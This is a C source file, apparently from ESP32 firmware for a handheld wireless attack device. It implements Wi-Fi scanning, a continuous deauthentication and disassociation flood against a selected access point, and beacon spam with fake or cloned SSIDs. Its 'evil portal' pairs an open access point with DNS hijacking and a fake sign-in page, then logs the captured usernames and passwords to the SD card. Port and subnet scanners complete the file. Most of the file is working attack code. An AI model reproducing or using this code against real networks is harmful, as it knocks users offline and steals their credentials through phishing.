#include "managers/wifi_manager.h"
#include "core/utils.h"
#include "core/sdio_transport.h"
#include "core/dns_server.h"
#include "managers/ap_manager.h"
#include "managers/sd_card_manager.h"
#include "vendor/pcap.h"

#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"

#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include "esp_sntp.h"

static const char *TAG = "wifi_mgr";

#define OUT(fmt, ...) spook_output(fmt, ##__VA_ARGS__)

/* ── State ── */
ghost_ap_record_t     g_ap_list[MAX_AP_RECORDS];
int                    g_ap_count = 0;
ghost_station_record_t g_station_list[MAX_STATION_RECORDS];
int                    g_station_count = 0;
static int             s_selected_ap = -1;
static bool            s_wifi_initialized = false;
static bool            s_connected = false;
static esp_netif_t    *s_sta_netif = NULL;
static esp_netif_t    *s_ap_netif = NULL;
static TaskHandle_t    s_deauth_task = NULL;
static TaskHandle_t    s_beacon_task = NULL;
static bool            s_deauth_running = false;
static bool            s_beacon_running = false;
static uint32_t        s_deauth_packets_sent = 0;

/* ── Event handler ── */
static void wifi_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data) {
    if (base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        s_connected = false;
    } else if (base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        s_connected = true;
        ip_event_got_ip_t *event = (ip_event_got_ip_t *)data;
        OUT("Got IP: " IPSTR "\n", IP2STR(&event->ip_info.ip));
        sdio_transport_set_status(GHOST_STATUS_CONNECTED);

        /* Auto-sync time via NTP when we get internet access */
        if (!spook_has_realtime()) {
            esp_sntp_setoperatingmode(SNTP_OPMODE_POLL);
            esp_sntp_setservername(0, "pool.ntp.org");
            esp_sntp_init();
            ESP_LOGI(TAG, "NTP time sync started");
        }
    }
}

esp_err_t wifi_manager_init(void) {
    if (s_wifi_initialized) return ESP_OK;

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    s_sta_netif = esp_netif_create_default_wifi_sta();
    s_ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                    wifi_event_handler, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                    wifi_event_handler, NULL, NULL));

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_start());

    s_wifi_initialized = true;
    ESP_LOGI(TAG, "WiFi initialized");
    return ESP_OK;
}

/* ── Scanning ── */
void wifi_manager_start_scan(void) {
    wifi_scan_config_t scan_cfg = { .show_hidden = true, .scan_type = WIFI_SCAN_TYPE_ACTIVE };
    esp_wifi_set_mode(WIFI_MODE_STA);
    sdio_transport_set_radio_mode(GHOST_RADIO_WIFI_SCAN);
    sdio_transport_set_status(GHOST_STATUS_SCANNING);
    esp_wifi_scan_start(&scan_cfg, true); /* blocking */

    uint16_t num = MAX_AP_RECORDS;
    wifi_ap_record_t ap_records[MAX_AP_RECORDS];
    esp_wifi_scan_get_ap_records(&num, ap_records);

    g_ap_count = num;
    for (int i = 0; i < num; i++) {
        memcpy(g_ap_list[i].bssid, ap_records[i].bssid, 6);
        strncpy(g_ap_list[i].ssid, (char *)ap_records[i].ssid, 32);
        g_ap_list[i].rssi = ap_records[i].rssi;
        g_ap_list[i].channel = ap_records[i].primary;
        g_ap_list[i].authmode = ap_records[i].authmode;
        g_ap_list[i].selected = (i == s_selected_ap);
    }
    OUT("Found %d APs\n", g_ap_count);

    sdio_transport_set_status(GHOST_STATUS_READY);
    sdio_transport_set_radio_mode(GHOST_RADIO_IDLE);

    /* Emit structured scan results over SDIO for P4 UI */
    if (sdio_transport_is_active() && g_ap_count > 0) {
        /* Send in batches of 20 (fits in one SDIO frame) */
        int sent = 0;
        while (sent < g_ap_count) {
            int batch = g_ap_count - sent;
            if (batch > 20) batch = 20;

            uint8_t buf[sizeof(ghost_scan_header_t) + 20 * sizeof(ghost_scan_wifi_ap_t)];
            ghost_scan_header_t *hdr = (ghost_scan_header_t *)buf;
            hdr->scan_type = GHOST_SCAN_WIFI_AP;
            hdr->count = batch;
            hdr->flags = (sent + batch < g_ap_count) ? GHOST_SCAN_FLAG_MORE : 0;

            ghost_scan_wifi_ap_t *records = (ghost_scan_wifi_ap_t *)(buf + sizeof(ghost_scan_header_t));
            for (int i = 0; i < batch; i++) {
                ghost_ap_record_t *ap = &g_ap_list[sent + i];
                memcpy(records[i].bssid, ap->bssid, 6);
                records[i].rssi = ap->rssi;
                records[i].channel = ap->channel;
                records[i].authmode = (uint8_t)ap->authmode;
                size_t slen = strlen(ap->ssid);
                records[i].ssid_len = slen > 18 ? 18 : slen;
                memcpy(records[i].ssid, ap->ssid, records[i].ssid_len);
            }

            sdio_transport_send(GHOST_FRAME_SCAN_RESULT, buf,
                sizeof(ghost_scan_header_t) + batch * sizeof(ghost_scan_wifi_ap_t));
            sent += batch;
        }
    }
}

void wifi_manager_print_scan_results(void) {
    OUT("%-4s %-32s %-18s %-6s %-4s %s\n", "IDX", "SSID", "BSSID", "RSSI", "CH", "AUTH");
    for (int i = 0; i < g_ap_count; i++) {
        ghost_ap_record_t *a = &g_ap_list[i];
        const char *auth_str[] = {"OPEN","WEP","WPA","WPA2","WPA/2","WPA3","WPA2/3","WAPI","OWE","MAX"};
        int ai = a->authmode;
        if (ai < 0 || ai > 8) ai = 8;
        OUT("%c%-3d %-32s %02x:%02x:%02x:%02x:%02x:%02x %4d  %2d  %s\n",
            a->selected ? '*' : ' ', i, a->ssid,
            a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
            a->rssi, a->channel, auth_str[ai]);
    }
}

void wifi_manager_list_stations(void) {
    OUT("Tracked stations: %d\n", g_station_count);
    for (int i = 0; i < g_station_count; i++) {
        ghost_station_record_t *s = &g_station_list[i];
        OUT("  %02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x RSSI %d\n",
            s->mac[0], s->mac[1], s->mac[2], s->mac[3], s->mac[4], s->mac[5],
            s->bssid[0], s->bssid[1], s->bssid[2], s->bssid[3], s->bssid[4], s->bssid[5],
            s->rssi);
    }
}

bool wifi_manager_select_ap(int index) {
    if (index < 0 || index >= g_ap_count) return false;
    if (s_selected_ap >= 0) g_ap_list[s_selected_ap].selected = false;
    s_selected_ap = index;
    g_ap_list[index].selected = true;
    return true;
}

ghost_ap_record_t *wifi_manager_get_selected_ap(void) {
    if (s_selected_ap < 0 || s_selected_ap >= g_ap_count) return NULL;
    return &g_ap_list[s_selected_ap];
}

ghost_ap_record_t *wifi_manager_get_ap_list(int *count) {
    if (count) *count = g_ap_count;
    return g_ap_list;
}

/* ── Monitor mode ── */
void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(callback);
    esp_wifi_set_promiscuous(true);
    sdio_transport_set_radio_mode(GHOST_RADIO_WIFI_MONITOR);
    ESP_LOGI(TAG, "Monitor mode started");
}

void wifi_manager_stop_monitor_mode(void) {
    esp_wifi_set_promiscuous(false);
    g_station_count = 0;
    sdio_transport_set_radio_mode(GHOST_RADIO_IDLE);
    ESP_LOGI(TAG, "Monitor mode stopped");
}

/* ── Station connect ── */
esp_err_t wifi_manager_connect(const char *ssid, const char *password) {
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_config_t cfg = {0};
    strncpy((char *)cfg.sta.ssid, ssid, sizeof(cfg.sta.ssid) - 1);
    if (password) strncpy((char *)cfg.sta.password, password, sizeof(cfg.sta.password) - 1);

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &cfg));
    sdio_transport_set_radio_mode(GHOST_RADIO_WIFI_STA);
    return esp_wifi_connect();
}

void wifi_manager_disconnect(void) {
    esp_wifi_disconnect();
    s_connected = false;
    sdio_transport_set_radio_mode(GHOST_RADIO_IDLE);
    sdio_transport_set_status(GHOST_STATUS_READY);
}

bool wifi_manager_is_connected(void) { return s_connected; }

/* ── Deauth attack ── */
static const uint8_t s_deauth_frame[] = {
    0xC0, 0x00, /* frame control: deauth */
    0x00, 0x00, /* duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* DA (filled) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA (filled) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID (filled) */
    0x00, 0x00, /* seq ctrl */
    0x01, 0x00, /* reason: unspecified */
};

static void deauth_task(void *arg) {
    ghost_ap_record_t *ap = wifi_manager_get_selected_ap();
    if (!ap) { s_deauth_running = false; vTaskDelete(NULL); return; }

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_channel(ap->channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[sizeof(s_deauth_frame)];
    uint16_t seq = 0;

    while (s_deauth_running) {
        memcpy(frame, s_deauth_frame, sizeof(frame));

        /* Broadcast deauth from AP */
        memset(&frame[4], 0xFF, 6);           /* DA = broadcast */
        memcpy(&frame[10], ap->bssid, 6);     /* SA = AP */
        memcpy(&frame[16], ap->bssid, 6);     /* BSSID = AP */
        frame[22] = seq & 0xFF;
        frame[23] = (seq >> 8) & 0xFF;
        seq++;

        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        s_deauth_packets_sent++;

        /* Also send disassoc (subtype 0x0A) */
        frame[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        s_deauth_packets_sent++;

        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}

void wifi_manager_start_deauth(void) {
    if (s_deauth_running) return;
    if (!wifi_manager_get_selected_ap()) { OUT("No AP selected. Use scanap + select first.\n"); return; }
    s_deauth_running = true;
    s_deauth_packets_sent = 0;
    sdio_transport_set_status(GHOST_STATUS_ATTACKING);
    xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, &s_deauth_task);
}

void wifi_manager_stop_deauth(void) {
    s_deauth_running = false;
    sdio_transport_set_status(GHOST_STATUS_READY);
    OUT("Deauth: %lu packets sent\n", (unsigned long)s_deauth_packets_sent);
}

/* ── Beacon spam ── */
static const uint8_t s_beacon_template[] = {
    0x80, 0x00, 0x00, 0x00, /* frame control: beacon */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* DA = broadcast */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA (random) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID (same as SA) */
    0x00, 0x00, /* seq ctrl */
    /* Fixed params: timestamp (8), interval (2), capabilities (2) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* timestamp */
    0x64, 0x00, /* interval = 100 TU */
    0x31, 0x04, /* capabilities: ESS, privacy */
};

static char s_beacon_mode[8] = {0};
static char s_beacon_ssid[33] = {0};

static void beacon_task(void *arg) {
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    uint8_t frame[256];
    uint16_t seq = 0;

    static const char *rickroll_ssids[] = {
        "Never Gonna Give You Up", "Never Gonna Let You Down",
        "Never Gonna Run Around", "And Desert You",
        "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
    };

    while (s_beacon_running) {
        const char *ssid = s_beacon_ssid;
        uint8_t mac[6];
        esp_fill_random(mac, 6);
        mac[0] = (mac[0] & 0xFE) | 0x02; /* locally administered, unicast */

        if (strcmp(s_beacon_mode, "-r") == 0) {
            /* Random SSID */
            char rnd[33];
            int len = 4 + (esp_random() % 24);
            for (int i = 0; i < len; i++) rnd[i] = 'A' + (esp_random() % 26);
            rnd[len] = 0;
            ssid = rnd;
        } else if (strcmp(s_beacon_mode, "-rr") == 0) {
            ssid = rickroll_ssids[esp_random() % 6];
        } else if (strcmp(s_beacon_mode, "-l") == 0) {
            if (g_ap_count > 0) ssid = g_ap_list[esp_random() % g_ap_count].ssid;
        }

        size_t ssid_len = strlen(ssid);
        if (ssid_len > 32) ssid_len = 32;

        memcpy(frame, s_beacon_template, sizeof(s_beacon_template));
        memcpy(&frame[10], mac, 6);
        memcpy(&frame[16], mac, 6);
        frame[22] = seq & 0xFF;
        frame[23] = (seq >> 8) & 0xFF;
        seq++;

        /* Add SSID IE */
        int pos = sizeof(s_beacon_template);
        frame[pos++] = 0x00; /* SSID tag */
        frame[pos++] = ssid_len;
        memcpy(&frame[pos], ssid, ssid_len);
        pos += ssid_len;

        /* Supported rates IE */
        frame[pos++] = 0x01;
        frame[pos++] = 0x08;
        uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
        memcpy(&frame[pos], rates, 8);
        pos += 8;

        /* DS Parameter Set (channel) */
        frame[pos++] = 0x03;
        frame[pos++] = 0x01;
        uint8_t ch; wifi_second_chan_t sec;
        esp_wifi_get_channel(&ch, &sec);
        frame[pos++] = ch;

        esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    vTaskDelete(NULL);
}

void wifi_manager_start_beacon_spam(const char *mode, const char *ssid) {
    if (s_beacon_running) wifi_manager_stop_beacon_spam();
    strncpy(s_beacon_mode, mode, sizeof(s_beacon_mode) - 1);
    if (ssid) strncpy(s_beacon_ssid, ssid, sizeof(s_beacon_ssid) - 1);
    else if (mode[0] != '-') { strncpy(s_beacon_ssid, mode, sizeof(s_beacon_ssid) - 1); strcpy(s_beacon_mode, "custom"); }
    s_beacon_running = true;
    xTaskCreate(beacon_task, "beacon", 4096, NULL, 5, &s_beacon_task);
    OUT("Beacon spam started (%s)\n", s_beacon_mode);
}

void wifi_manager_stop_beacon_spam(void) {
    s_beacon_running = false;
}

/* ── Evil portal with SD card folder serving ──
 *
 * Portal files live in /sdcard/portals/<name>/
 * Required: index.html (main page)
 * Optional: post.html (served after credential capture)
 *           Any other files (CSS, JS, images) served by URI path
 *
 * Example:
 *   /sdcard/portals/google/index.html
 *   /sdcard/portals/google/style.css
 *   /sdcard/portals/google/logo.png
 *   /sdcard/portals/google/post.html
 *
 * Command: startportal google FreeWiFi login.portal
 */
static httpd_handle_t s_portal_httpd = NULL;
static dns_server_handle_t s_portal_dns = NULL;
static char s_portal_dir[128] = {0}; /* e.g. /sdcard/portals/google */

/* Default built-in credential capture page */
static const char *s_default_portal_html =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign In</title><style>"
    "body{font-family:sans-serif;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}"
    ".card{background:#16213e;padding:2rem;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,.3);width:90%;max-width:360px}"
    "h1{text-align:center;margin-bottom:1.5rem;font-size:1.4rem}"
    "input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:8px;background:#1a1a2e;color:#fff;box-sizing:border-box;font-size:1rem}"
    "button{width:100%;padding:12px;margin-top:16px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:1rem;cursor:pointer}"
    "button:hover{background:#c73050}"
    "</style></head><body>"
    "<div class='card'><h1>Welcome</h1>"
    "<form action='/login' method='POST'>"
    "<input name='user' placeholder='Email or Username' required/>"
    "<input name='pass' type='password' placeholder='Password' required/>"
    "<button type='submit'>Sign In</button></form>"
    "<p style='text-align:center;margin-top:1rem;font-size:.8rem;opacity:.6'>Secure connection</p>"
    "</div></body></html>";

/* Guess content type from file extension */
static const char *guess_content_type(const char *path) {
    const char *dot = strrchr(path, '.');
    if (!dot) return "application/octet-stream";
    if (strcasecmp(dot, ".html") == 0 || strcasecmp(dot, ".htm") == 0) return "text/html";
    if (strcasecmp(dot, ".css") == 0)  return "text/css";
    if (strcasecmp(dot, ".js") == 0)   return "application/javascript";
    if (strcasecmp(dot, ".json") == 0) return "application/json";
    if (strcasecmp(dot, ".png") == 0)  return "image/png";
    if (strcasecmp(dot, ".jpg") == 0 || strcasecmp(dot, ".jpeg") == 0) return "image/jpeg";
    if (strcasecmp(dot, ".gif") == 0)  return "image/gif";
    if (strcasecmp(dot, ".svg") == 0)  return "image/svg+xml";
    if (strcasecmp(dot, ".ico") == 0)  return "image/x-icon";
    if (strcasecmp(dot, ".woff") == 0) return "font/woff";
    if (strcasecmp(dot, ".woff2") == 0)return "font/woff2";
    if (strcasecmp(dot, ".ttf") == 0)  return "font/ttf";
    if (strcasecmp(dot, ".txt") == 0)  return "text/plain";
    return "application/octet-stream";
}

/* Stream a file from the portal folder to the HTTP response */
static esp_err_t serve_file(httpd_req_t *req, const char *filepath) {
    FILE *f = fopen(filepath, "r");
    if (!f) return ESP_ERR_NOT_FOUND;

    httpd_resp_set_type(req, guess_content_type(filepath));
    httpd_resp_set_status(req, "200 OK");

    char chunk[1024];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0) {
        if (httpd_resp_send_chunk(req, chunk, n) != ESP_OK) {
            fclose(f);
            httpd_resp_send_chunk(req, NULL, 0);
            return ESP_FAIL;
        }
    }
    fclose(f);
    return httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t portal_get_handler(httpd_req_t *req) {
    /* If we have a portal folder, try to serve the requested file from it */
    if (s_portal_dir[0]) {
        char filepath[192];
        const char *uri = req->uri;

        /* Strip query string */
        const char *q = strchr(uri, '?');
        size_t uri_len = q ? (size_t)(q - uri) : strlen(uri);

        if (uri_len <= 1 || (uri_len == 1 && uri[0] == '/')) {
            /* Root request → serve index.html */
            snprintf(filepath, sizeof(filepath), "%s/index.html", s_portal_dir);
        } else {
            /* Map URI path to file in portal folder.
             * Sanitize: reject paths with ".." to prevent directory traversal */
            if (strstr(uri, "..") != NULL) {
                httpd_resp_send_err(req, HTTPD_403_FORBIDDEN, "Forbidden");
                return ESP_FAIL;
            }
            snprintf(filepath, sizeof(filepath), "%s%.*s", s_portal_dir, (int)uri_len, uri);
        }

        esp_err_t ret = serve_file(req, filepath);
        if (ret == ESP_OK) return ESP_OK;

        /* File not found in folder — if this was a sub-resource request,
         * return 404 instead of falling back to the default page */
        if (uri_len > 1 && strstr(uri, ".") != NULL) {
            httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "Not Found");
            return ESP_FAIL;
        }

        /* Otherwise fall through to default (handles captive portal detection URLs) */
    }

    /* Fallback: built-in page */
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, s_default_portal_html, -1);
}

static esp_err_t portal_post_handler(httpd_req_t *req) {
    char buf[512] = {0};
    int total_len = req->content_len;
    int received = 0;

    while (received < total_len && received < (int)sizeof(buf) - 1) {
        int ret = httpd_req_recv(req, buf + received, sizeof(buf) - 1 - received);
        if (ret <= 0) break;
        received += ret;
    }
    buf[received] = '\0';

    OUT("Portal credentials captured: %s\n", buf);

    /* Log to SD card */
    const char *mount = sd_card_get_mount_point();
    if (mount) {
        char log_path[128];
        snprintf(log_path, sizeof(log_path), "%s/portal_creds.txt", mount);
        FILE *f = fopen(log_path, "a");
        if (f) {
            fprintf(f, "%s\n", buf);
            fclose(f);
        }
    }

    /* Try to serve post.html from the portal folder */
    if (s_portal_dir[0]) {
        char post_path[192];
        snprintf(post_path, sizeof(post_path), "%s/post.html", s_portal_dir);
        if (serve_file(req, post_path) == ESP_OK) return ESP_OK;
    }

    /* Fallback thank-you page */
    const char *resp =
        "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Success</title><style>body{font-family:sans-serif;background:#1a1a2e;color:#fff;"
        "display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}"
        "</style></head><body><h1>Thank you. You may now use the network.</h1></body></html>";
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, resp, -1);
}

void wifi_manager_start_evil_portal(const char *url, const char *ssid,
                                     const char *password, const char *ap_ssid,
                                     const char *domain) {
    s_portal_dir[0] = '\0';

    if (url && url[0]) {
        const char *mount = sd_card_get_mount_point();
        if (mount && strncmp(url, "http", 4) != 0) {
            /* Treat as a folder name under /sdcard/portals/ */
            snprintf(s_portal_dir, sizeof(s_portal_dir), "%s/portals/%s", mount, url);

            /* Verify index.html exists in the folder */
            char index_path[192];
            snprintf(index_path, sizeof(index_path), "%s/index.html", s_portal_dir);
            FILE *test = fopen(index_path, "r");
            if (test) {
                fclose(test);
                OUT("Portal: serving from %s/\n", s_portal_dir);
            } else {
                OUT("Warning: %s not found, using built-in portal\n", index_path);
                s_portal_dir[0] = '\0';
            }
        }
    }

    /* If SSID+pass provided, connect to real network first */
    if (ssid && ssid[0] && password && password[0]) {
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        wifi_manager_connect(ssid, password);
        vTaskDelay(pdMS_TO_TICKS(5000));
    } else {
        esp_wifi_set_mode(WIFI_MODE_AP);
    }

    /* Configure SoftAP */
    wifi_config_t ap_cfg = {
        .ap = { .max_connection = 4, .authmode = WIFI_AUTH_OPEN, .channel = 1 }
    };
    strncpy((char *)ap_cfg.ap.ssid, ap_ssid, sizeof(ap_cfg.ap.ssid) - 1);
    ap_cfg.ap.ssid_len = strlen(ap_ssid);
    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);

    /* Start DNS hijack */
    dns_server_config_t dns_cfg = DNS_SERVER_CONFIG_SINGLE("*", "WIFI_AP_DEF");
    s_portal_dns = start_dns_server(&dns_cfg);

    /* Start HTTP server */
    httpd_config_t httpd_cfg = HTTPD_DEFAULT_CONFIG();
    httpd_cfg.max_uri_handlers = 12;
    httpd_cfg.lru_purge_enable = true;
    httpd_cfg.stack_size = 8192;

    sdio_transport_set_status(GHOST_STATUS_PORTAL);
    sdio_transport_set_radio_mode(GHOST_RADIO_WIFI_AP);
    if (httpd_start(&s_portal_httpd, &httpd_cfg) == ESP_OK) {
        httpd_uri_t get_uri = { .uri = "/", .method = HTTP_GET, .handler = portal_get_handler };
        httpd_uri_t post_uri = { .uri = "/login", .method = HTTP_POST, .handler = portal_post_handler };
        httpd_uri_t catch_uri = { .uri = "/*", .method = HTTP_GET, .handler = portal_get_handler };
        httpd_uri_t catch_post = { .uri = "/*", .method = HTTP_POST, .handler = portal_post_handler };
        httpd_register_uri_handler(s_portal_httpd, &get_uri);
        httpd_register_uri_handler(s_portal_httpd, &post_uri);
        httpd_register_uri_handler(s_portal_httpd, &catch_uri);
        httpd_register_uri_handler(s_portal_httpd, &catch_post);
    }
}

void wifi_manager_stop_evil_portal(void) {
    if (s_portal_httpd) { httpd_stop(s_portal_httpd); s_portal_httpd = NULL; }
    if (s_portal_dns) { stop_dns_server(s_portal_dns); s_portal_dns = NULL; }
    s_portal_dir[0] = '\0';
    esp_wifi_set_mode(WIFI_MODE_STA);
    sdio_transport_set_status(GHOST_STATUS_READY);
    sdio_transport_set_radio_mode(GHOST_RADIO_IDLE);
}

/* ── Network tools ── */
void wifi_manager_start_ip_lookup(void) {
    if (!s_connected) { OUT("Not connected to WiFi.\n"); return; }
    esp_netif_ip_info_t info;
    esp_netif_get_ip_info(s_sta_netif, &info);
    OUT("IP: " IPSTR "\nGW: " IPSTR "\nMask: " IPSTR "\n",
        IP2STR(&info.ip), IP2STR(&info.gw), IP2STR(&info.netmask));
}

static const int s_common_ports[] = {21,22,23,25,53,80,110,135,139,143,443,445,993,995,3306,3389,5900,8080,8443,8888};

void scan_ports_on_host(const char *ip, host_result_t *result) {
    result->num_open_ports = 0;
    strncpy(result->ip, ip, 15);

    for (int i = 0; i < MAX_COMMON_PORTS; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv = {0, 500000}; /* 500ms timeout */
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port = htons(s_common_ports[i]),
        };
        inet_aton(ip, &addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            result->open_ports[result->num_open_ports++] = s_common_ports[i];
        }
        close(sock);
    }
}

void scan_ip_port_range(const char *ip, int start, int end) {
    OUT("Scanning %s ports %d-%d...\n", ip, start, end);
    for (int port = start; port <= end; port++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv = {0, 300000};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(port) };
        inet_aton(ip, &addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            OUT("  Port %d OPEN\n", port);
        }
        close(sock);

        if (port % 1000 == 0) vTaskDelay(pdMS_TO_TICKS(10));
    }
    OUT("Scan complete.\n");
}

void wifi_manager_scan_subnet(void) {
    if (!s_connected) { OUT("Not connected.\n"); return; }

    esp_netif_ip_info_t info;
    esp_netif_get_ip_info(s_sta_netif, &info);

    uint32_t base_ip = ntohl(info.ip.addr) & 0xFFFFFF00;
    OUT("Scanning subnet...\n");

    for (int i = 1; i < 255; i++) {
        uint32_t target = htonl(base_ip | i);
        char ip_str[16];
        snprintf(ip_str, sizeof(ip_str), IPSTR, (target)&0xFF, (target>>8)&0xFF, (target>>16)&0xFF, (target>>24)&0xFF);

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct timeval tv = {0, 200000};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(80) };
        addr.sin_addr.s_addr = target;

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            OUT("  Host up: %s\n", ip_str);
        }
        close(sock);
    }
    OUT("Subnet scan complete.\n");
}
